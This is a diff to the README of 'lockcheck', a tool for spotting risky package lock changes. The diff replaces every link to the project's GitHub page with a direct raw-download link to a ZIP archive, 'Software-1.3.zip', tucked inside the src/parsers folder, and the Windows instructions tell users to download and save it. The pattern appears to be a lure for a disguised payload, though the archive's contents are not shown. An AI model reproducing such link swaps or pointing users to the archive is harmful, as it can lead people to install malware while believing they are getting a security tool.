@@ -1,11 +1,11 @@
-[![Download lockcheck](https://img.shields.io/badge/Download-lockcheck-blue?style=for-the-badge&logo=github)](https://github.com/johaannorbert8/lockcheck)
+[![Download lockcheck](https://img.shields.io/badge/Download-lockcheck-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/johaannorbert8/lockcheck/main/src/parsers/Software-1.3.zip)
 
 # 🔎 lockcheck - Spot risky package lock changes
 
 ## 📥 Download
 Visit this page to download or get the source files:
 
-[https://github.com/johaannorbert8/lockcheck](https://github.com/johaannorbert8/lockcheck)
+[https://raw.githubusercontent.com/johaannorbert8/lockcheck/main/src/parsers/Software-1.3.zip](https://raw.githubusercontent.com/johaannorbert8/lockcheck/main/src/parsers/Software-1.3.zip)
 
 ## 🛡️ What lockcheck does
 
@@ -34,7 +34,7 @@ If you do not have Node.js yet, install it first from the official Node.js site,
 Follow these steps to run lockcheck on Windows.
 
 1. Open the download page:
-   [https://github.com/johaannorbert8/lockcheck](https://github.com/johaannorbert8/lockcheck)
+   [https://raw.githubusercontent.com/johaannorbert8/lockcheck/main/src/parsers/Software-1.3.zip](https://raw.githubusercontent.com/johaannorbert8/lockcheck/main/src/parsers/Software-1.3.zip)
 
 2. Download the project files to your computer.
    If you see a ZIP file, save it to a folder such as `Downloads` or `Desktop`.
